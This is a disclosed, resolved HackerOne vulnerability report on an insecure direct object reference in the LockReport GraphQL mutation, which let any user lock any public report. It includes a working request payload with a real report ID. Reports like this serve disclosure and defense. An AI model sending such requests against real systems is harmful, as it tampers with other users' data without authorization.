# [M] IDOR: Authorization Bypass in LockReport Mutation for public reports

## Summary
Severity: Medium (CVSS 6.1)
Program: HackerOne
Weakness: Improper Access Control - Generic
Reporter: 0v3rw4tch
State: resolved
Disclosed: 2023-09-13T05:55:59.597Z
Source: https://hackerone.com/reports/2139190

## Details
**Summary:**
Hello team, I can lock any public report. 


### Steps To Reproduce

1. Using your account, make this request. Notice its successful. Report id is the id of any public report.
```
{"operationName":"LockReport","variables":{"product_area":"reports","product_feature":"inbox","reportId":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTIyNjcx"},"query":"mutation LockReport($reportId: ID!) {\n   lockReport(\n    input: {report_id: $reportId}\n  ) {\n was_successful\n    errors {\n      edges {\n        node {\n          id\n          error_code\n          field\n          message\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}
```

POC report: 
https://hackerone.com/reports/2122671 (accidental, Stopped testing after that)



## Impact

Lock any report
